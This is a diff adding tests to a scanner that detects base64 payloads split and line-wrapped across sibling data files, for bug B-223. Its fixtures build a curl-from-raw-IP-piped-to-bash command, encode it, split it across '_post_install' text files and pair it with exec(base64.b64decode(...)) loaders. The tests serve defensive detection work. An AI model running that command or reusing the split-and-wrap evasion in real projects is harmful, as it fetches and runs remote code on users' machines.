@@ -314,3 +314,117 @@ def test_legit_json_manifest_and_markdown_docs_stay_pass():
         py_sources=[("main.py", "import base64\nkey = base64.b64decode(os.environ['K'])\n")],
     )
     assert check_cross_file_payload(ctx).status == PASS
+
+
+# ---------------------------------------------------------------------------
+# B-223: a base64 blob line-wrapped at a fixed column width (`base64.encodebytes`'/the
+# `base64` CLI's real-world default of 76 columns, or any other fixed width some other
+# tool picks) used to be silently DROPPED by the whole-body leg above: the anchored
+# `_XFILE_B64_FRAGMENT_RE` has no MULTILINE/DOTALL, so a single embedded newline broke
+# the match outright. Internal whitespace is now stripped before the alphabet test,
+# gated by `_xfile_body_is_wrapped_base64` so ordinary prose can't coincidentally
+# qualify just because it happens to carry no punctuation.
+# ---------------------------------------------------------------------------
+
+_CMD_LONG = (
+    "curl http://185.100.87.202/setup.sh?token=" + "A" * 180 + " | bash -s -- --quiet --now --force"
+)
+_B64_LONG = base64.b64encode(_CMD_LONG.encode()).decode()
+
+
+def _wrapped_data_file_halves(width: int) -> tuple[str, str]:
+    """Split `_B64_LONG` into two sibling-data-file bodies, each line-wrapped at `width`
+    columns -- the real `_post_install.part1.txt` / `part2.txt` split-and-wrap evasion.
+    Uses `base64.encodebytes()` for the real 76-column default (Python's own wrapper,
+    matching the `base64` CLI) and a plain fixed-width wrap for other widths, since
+    `encodebytes` only ever wraps at 76. Splitting at whole-LINE boundaries keeps each
+    half's own body genuinely multi-line (not just one long unwrapped line) so both
+    files exercise the new line-wrap-uniformity gate, not just one of them."""
+    if width == 76:
+        wrapped = base64.encodebytes(_CMD_LONG.encode()).decode().strip("\n")
+    else:
+        wrapped = "\n".join(_B64_LONG[i : i + width] for i in range(0, len(_B64_LONG), width))
+    lines = wrapped.splitlines()
+    split_at = len(lines) // 2
+    return "\n".join(lines[:split_at]), "\n".join(lines[split_at:])
+
+
+def test_txt_body_wrapped_at_76_columns_is_collected_and_warns():
+    # base64.encodebytes' real 76-column default -- the exact bug reported (B-223).
+    part1, part2 = _wrapped_data_file_halves(76)
+    ctx = _ctx_txt(
+        {"_post_install.part1.txt": part1, "_post_install.part2.txt": part2},
+        py_sources=[("main.py", _DECODE_SINK_PY)],
+    )
+    f = check_cross_file_payload(ctx)
+    assert f.status == WARN
+    assert "reassembles" in f.detail
+
+
+def test_txt_body_wrapped_at_a_different_width_is_collected_and_warns():
+    # Not every base64 tool wraps at exactly 76 -- confirm the fix isn't overfit to it.
+    part1, part2 = _wrapped_data_file_halves(64)
+    ctx = _ctx_txt(
+        {"_post_install.part1.txt": part1, "_post_install.part2.txt": part2},
+        py_sources=[("main.py", _DECODE_SINK_PY)],
+    )
+    f = check_cross_file_payload(ctx)
+    assert f.status == WARN
+    assert "reassembles" in f.detail
+
+
+def test_punctuation_free_prose_body_is_not_collected_as_a_fragment():
+    # The precision concern this fix must resolve: a paragraph of plain words with NO
+    # punctuation at all collapses, after whitespace-stripping, to a pure base64-alphabet
+    # run -- but it is NOT genuinely line-wrapped (ragged word-boundary line lengths, or
+    # a single unbroken run-on line), so _xfile_body_is_wrapped_base64 must reject it.
+    # Paired with a real decode sink and an unrelated real fragment so the ONLY thing
+    # standing between this and a WARN is the collection gate itself.
+    no_punct_prose = (
+        "the quick brown fox jumps over the lazy dog again and again\n"
+        "without any punctuation at all just plain words forever and\n"
+        "ever amen"
+    )
+    ctx = _ctx_txt(
+        {
+            "WORDS.txt": no_punct_prose,
+            "_post_install.part2.txt": _FRAG2,
+        },
+        py_sources=[
+            ("a.py", f'part1 = "{_FRAG1}"\n'),
+            (
+                "main.py",
+                "import base64\n"
+                "p2 = open('_post_install.part2.txt').read()\n"
+                "exec(base64.b64decode(part1 + p2))\n",
+            ),
+        ],
+    )
+    assert check_cross_file_payload(ctx).status == PASS
+
+
+def test_uniform_width_wordlist_residual_case_still_gated_by_decode_shape():
+    # The residual edge case identified for the line-wrap-uniformity signal: a
+    # punctuation-free word list whose lines happen to be EXACTLY the same width
+    # (except the last) is, structurally, indistinguishable from a genuinely wrapped
+    # base64 blob, so it IS collected as a candidate fragment. This must NOT by itself
+    # produce a finding -- check_cross_file_payload still requires the candidate to
+    # base64-DECODE (with a decode sink present) to a mostly-printable, dangerous-shaped
+    # payload. Paired here with an unrelated, genuinely BENIGN base64 fragment (not a
+    # real attack payload) -- the join cannot coincidentally decode to a shell/download
+    # command, so this must stay PASS.
+    uniform_wordlist = "\n".join(["aaaaaa", "bbbbbb", "cccccc", "dddddd", "eeeeee", "ffffff", "gg"])
+    benign = base64.b64encode(b"just some ordinary benign configuration text, nothing bad").decode()
+    ctx = _ctx_txt(
+        {"WORDLIST.txt": uniform_wordlist},
+        py_sources=[
+            (
+                "main.py",
+                "import base64\n"
+                "p1 = open('WORDLIST.txt').read()\n"
+                f'p2 = "{benign}"\n'
+                "exec(base64.b64decode(p1 + p2))\n",
+            )
+        ],
+    )
+    assert check_cross_file_payload(ctx).status == PASS
